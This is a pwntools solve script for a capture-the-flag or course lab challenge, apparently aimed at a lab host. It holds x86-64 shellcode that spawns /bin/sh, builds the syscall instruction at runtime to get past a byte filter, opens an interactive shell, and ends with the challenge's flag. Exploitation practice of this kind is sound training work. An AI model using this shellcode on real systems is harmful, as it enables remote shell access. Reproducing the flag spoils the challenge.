# %%

from pwn import *

# ref
# https://shihyu.github.io/books/ch19s05.html
# https://stackoverflow.com/questions/4584089/what-is-the-function-of-the-push-pop-instructions-used-on-registers-in-x86-ass

# %%

context.arch = "amd64"

conn = remote('10.113.184.121', 10042)
# conn = process(['./src/release/share/lab'])

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f53f764350c0410da16226f70ddb48f43d21213, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     conn,
#     gdbscript=gdbscript,
# )

# %%

# sc = shellcraft.sh()

binsh = str("/bin/sh").encode().hex()
binsh = bytearray.fromhex(binsh)[::-1].hex()

print(binsh)

payload = f"""
// %rdi: const char *filename
mov rax, 0x{binsh}
push rax
mov rdi, rsp

// %rsi: const char *const argv[]
xor rsi, rsi

// %rdx: const char *const envp[]
xor rdx, rdx

// %rax: 59
mov rax, 0x3b

// syscall
mov rbx, 0x040e
add rbx, 0x0101
mov QWORD PTR [rip], rbx
"""

asm_payload = asm(payload)

print(f"{payload = }")
print()

print(f"{asm_payload = }")
print(disasm(asm_payload))
print()

# pause()

conn.sendline(asm_payload)

conn.interactive()

# %%

# flag{How_you_do0o0o0o_sysca1111111}
